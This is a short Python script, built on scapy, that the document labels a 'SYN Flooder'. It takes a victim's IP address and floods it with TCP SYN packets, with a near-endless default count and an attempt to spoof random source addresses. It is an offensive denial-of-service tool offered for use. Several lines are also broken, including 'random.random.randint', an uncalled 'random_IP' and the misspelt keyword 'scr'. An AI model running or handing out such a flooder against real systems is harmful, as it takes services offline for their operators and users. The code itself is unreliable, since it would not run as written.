#!/usr/bin/env python3

import argparse
import random
from scapy.all import send, IP, TCP

default_pack = 999999999
max_ports = 65535


def random_IP():
    IP = "." .join(map(str, (random.randint(0, 255) for _ in range(4))))
    return IP


def get_args():
    parser = argparse.ArgumentParser(description="SYN Flooder\n")
    parser.add_argument("t", help="Victim's IP address")
    parser.add_argument(
        "-a", type=int, help="Amount of packets(default are infinity)", default=default_pack)
    parser.add_argument(
        "-p", type=int, help="Target port(default port is 80)", default=80)
    args = parser.parse_args()
    return args.t, args.p, args.a


def SYN_flood(Target_IP, dPort, packets_to_send):
    print("Sending packets to the target...")
    for i in range(packets_to_send):
        seq_n = random.randint(0, max_ports)
        sPort = random.randint(0, max_ports)
        Window = random.random.randint(0, max_ports)
        src_IP = random_IP
        packet = IP(dst=Target_IP, scr=src_IP)/TCP(sport=sPort,
                                                   dport=dPort, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
        print("Send all the packets")


def main():
    Target_IP, dPort, packets_to_send = get_args()
    SYN_flood(Target_IP, dPort, packets_to_send)


if __name__ == "__main__":
    main()
